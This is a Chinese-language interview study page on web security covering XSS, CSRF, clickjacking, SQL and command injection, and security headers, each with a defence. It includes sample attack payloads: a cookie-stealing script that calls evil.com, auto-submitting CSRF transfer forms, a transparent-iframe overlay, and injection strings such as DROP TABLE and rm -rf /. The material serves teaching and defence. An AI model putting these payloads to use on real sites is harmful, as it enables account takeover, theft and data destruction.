---
sidebar_position: 6
title: "Web 安全攻防"
difficulty: "hard"
tags: ["network", "security", "xss", "csrf", "injection"]
---

# 🛡️ Web 安全攻防

> **"安全不是可选项，而是必选项"** —— 前端安全是每个开发者必须掌握的防御知识，面试中也是高频考点。

## 一、XSS（跨站脚本攻击）

### 1.1 什么是 XSS？

```
XSS 攻击原理
═══════════════════════════════════════════════════════

攻击者将恶意脚本注入到网页中
        ↓
用户访问该网页
        ↓
浏览器执行恶意脚本
        ↓
窃取 Cookie、Token、敏感信息
冒充用户执行操作
重定向到钓鱼网站
```

### 1.2 XSS 的三种类型

```
XSS 类型对比
═══════════════════════════════════════════════════════

1. 存储型 XSS（最危险）
   恶意脚本存储在服务器（数据库、评论、论坛）
   → 用户访问页面时自动执行
   → 影响所有访问该页面的用户

   攻击流程：
   攻击者提交恶意脚本 → 服务器存储 → 用户访问 → 返回含脚本的页面 → 执行

2. 反射型 XSS
   恶意脚本在 URL 参数中
   → 服务器将参数拼接到页面返回
   → 用户点击恶意链接时执行

   攻击流程：
   攻击者构造恶意 URL → 用户点击 → 服务器返回含脚本的页面 → 执行

3. DOM 型 XSS
   前端 JavaScript 直接操作 DOM 时未过滤
   → 恶意脚本通过 innerHTML 等方法插入
   → 不经过服务器

   攻击流程：
   攻击者构造恶意 URL → 前端 JS 解析 URL → 操作 DOM → 执行
```

### 1.3 XSS 攻击示例

```html
<!-- 存储型 XSS 示例 -->
<!-- 攻击者在评论区提交： -->
<script>
  // 窃取 Cookie
  new Image().src = 'https://evil.com/steal?cookie=' + document.cookie;
</script>

<!-- 反射型 XSS 示例 -->
<!-- 恶意 URL：https://example.com/search?q=<script>alert('XSS')</script> -->
<!-- 服务器将 q 参数直接插入页面： -->
<div>搜索结果：<script>alert('XSS')</script></div>

<!-- DOM 型 XSS 示例 -->
<script>
  // 从 URL 取参数直接插入 DOM
  const name = new URLSearchParams(location.search).get('name');
  document.getElementById('greeting').innerHTML = 'Hello, ' + name;
  // 恶意 URL: ?name=<img src=x onerror=alert('XSS')>
</script>
```

### 1.4 XSS 防御方案

```js
// 1. 输出编码（最重要的防御手段）
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
  };
  return str.replace(/[&<>"']/g, c => map[c]);
}

// 2. 使用 textContent 而非 innerHTML
// ❌ 危险
element.innerHTML = userInput;
// ✅ 安全
element.textContent = userInput;

// 3. CSP（内容安全策略）
// HTTP 响应头：
// Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'

// 4. HttpOnly Cookie（防止 JS 读取）
// Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict

// 5. 输入验证（前端 + 后端）
function validateInput(input) {
  // 只允许字母、数字、中文
  return /^[a-zA-Z0-9一-龥]+$/.test(input);
}
```

## 二、CSRF（跨站请求伪造）

### 2.1 什么是 CSRF？

```
CSRF 攻击原理
═══════════════════════════════════════════════════════

用户登录 bank.com，获得 Cookie
        ↓
用户访问 evil.com（恶意网站）
        ↓
evil.com 页面自动向 bank.com 发送请求
        ↓
浏览器自动携带 bank.com 的 Cookie
        ↓
bank.com 以为是用户操作，执行转账
```

### 2.2 CSRF 攻击示例

```html
<!-- evil.com 页面中的隐藏表单 -->
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById('csrf-form').submit();</script>

<!-- 或者通过 img 标签发起 GET 请求 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />

<!-- 或者通过 fetch 发起请求 -->
<script>
fetch('https://bank.com/transfer', {
  method: 'POST',
  credentials: 'include', // 携带 Cookie
  body: JSON.stringify({ to: 'attacker', amount: 10000 }),
  headers: { 'Content-Type': 'application/json' },
});
</script>
```

### 2.3 CSRF 防御方案

```js
// 1. CSRF Token（最常用）
// 服务器生成 Token，嵌入页面，提交时验证
// <input type="hidden" name="_csrf" value="abc123" />
// 或者放在请求头中：
fetch('/api/transfer', {
  headers: {
    'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content,
  },
});

// 2. SameSite Cookie（现代浏览器推荐）
// Set-Cookie: token=xxx; SameSite=Strict
// SameSite=Strict：完全禁止第三方 Cookie
// SameSite=Lax：允许顶级导航的 GET 请求（默认值）
// SameSite=None：允许跨站（必须配合 Secure）

// 3. 验证 Origin / Referer 头
// 服务器检查请求头中的 Origin 或 Referer 是否来自可信域名

// 4. 双重 Cookie 验证
// 前端从 Cookie 读取随机值，放到请求参数中
// 服务器验证 Cookie 中的值和参数中的值是否一致

// 5. 关键操作使用 POST + 验证码
// GET 请求不执行任何写操作
// 关键操作（转账、改密码）需要二次验证
```

## 三、点击劫持（Clickjacking）

```
点击劫持原理
═══════════════════════════════════════════════════════

攻击者将目标网站嵌入 iframe
        ↓
iframe 设置为透明（opacity: 0）
        ↓
在上层覆盖诱导用户点击的内容
        ↓
用户以为点击的是可见内容
实际点击的是透明 iframe 中的按钮
```

```html
<!-- 点击劫持示例 -->
<style>
  iframe {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0;           /* 透明 */
    z-index: 999;         /* 置顶 */
  }
  .fake-button {
    position: absolute;
    top: 100px; left: 100px;
    padding: 20px;
    background: red;
    color: white;
    cursor: pointer;
  }
</style>
<div class="fake-button">点击领取红包</div>
<iframe src="https://bank.com/transfer?to=attacker"></iframe>
```

```js
// 防御方案

// 1. X-Frame-Options 响应头
// X-Frame-Options: DENY           — 禁止任何网站嵌入
// X-Frame-Options: SAMEORIGIN     — 只允许同源网站嵌入
// X-Frame-Options: ALLOW-FROM uri — 只允许指定网站嵌入（已废弃）

// 2. CSP frame-ancestors（推荐）
// Content-Security-Policy: frame-ancestors 'self'
// Content-Security-Policy: frame-ancestors 'self' https://trusted.com

// 3. JavaScript 防御（辅助手段）
if (window.top !== window.self) {
  // 被嵌入了 iframe
  window.top.location = window.self.location;
}
```

## 四、注入攻击

### 4.1 SQL 注入

```js
// ❌ 危险：字符串拼接
const query = `SELECT * FROM users WHERE name = '${userInput}'`;
// 如果 userInput = "'; DROP TABLE users; --"
// 实际执行：SELECT * FROM users WHERE name = ''; DROP TABLE users; --'

// ✅ 安全：参数化查询
const query = 'SELECT * FROM users WHERE name = ?';
db.execute(query, [userInput]);

// ✅ 安全：使用 ORM
const user = await User.findOne({ where: { name: userInput } });
```

### 4.2 命令注入

```js
const { exec } = require('child_process');

// ❌ 危险
exec(`ls ${userInput}`);
// 如果 userInput = "; rm -rf /"

// ✅ 安全：使用 execFile 或参数数组
const { execFile } = require('child_process');
execFile('ls', [userInput]);
```

## 五、安全响应头

```
常用安全响应头
═══════════════════════════════════════════════════════

1. Content-Security-Policy (CSP)
   限制资源加载来源，防止 XSS
   Content-Security-Policy: default-src 'self'; script-src 'self'

2. X-Content-Type-Options
   防止浏览器嗅探 MIME 类型
   X-Content-Type-Options: nosniff

3. X-Frame-Options
   防止点击劫持
   X-Frame-Options: DENY

4. Strict-Transport-Security (HSTS)
   强制使用 HTTPS
   Strict-Transport-Security: max-age=31536000; includeSubDomains

5. X-XSS-Protection
   浏览器内置 XSS 过滤（已废弃，依赖 CSP）
   X-XSS-Protection: 0

6. Referrer-Policy
   控制 Referer 头信息
   Referrer-Policy: strict-origin-when-cross-origin

7. Permissions-Policy
   限制浏览器功能（摄像头、麦克风等）
   Permissions-Policy: camera=(), microphone=(), geolocation=()
```

## 六、前端安全最佳实践

```
前端安全清单
═══════════════════════════════════════════════════════

□ 所有用户输出都进行 HTML 编码
□ 使用 textContent 替代 innerHTML
□ 配置 CSP 响应头
□ Cookie 设置 HttpOnly + Secure + SameSite
□ 关键操作使用 CSRF Token
□ HTTPS 强制开启（HSTS）
□ 配置 X-Frame-Options 防止点击劫持
□ 输入验证（前端 + 后端双重验证）
□ 不在前端存储敏感信息（密钥、密码）
□ 第三方脚本定期审计
□ 依赖包定期更新（npm audit）
□ 使用 Subresource Integrity (SRI) 校验 CDN 资源
```

## 七、常见面试题

**Q1: XSS 的类型和区别？**

A: 存储型（恶意脚本存储在服务器，影响所有用户）、反射型（恶意脚本在 URL 中，需要用户点击链接）、DOM 型（前端 JS 直接操作 DOM，不经过服务器）。防御核心是输出编码和 CSP。

**Q2: CSRF 的原理和防御？**

A: 攻击者诱导用户访问恶意网站，该网站自动向目标网站发送请求，浏览器自动携带 Cookie。防御：CSRF Token、SameSite Cookie、验证 Origin 头、关键操作使用 POST。

**Q3: CSP 是什么？如何配置？**

A: Content-Security-Policy 是一个 HTTP 响应头，用于限制页面可以加载哪些资源。通过指定 `script-src`、`style-src`、`img-src` 等指令，可以有效防止 XSS 攻击。推荐使用 nonce 或 hash 方式，避免 `unsafe-inline`。
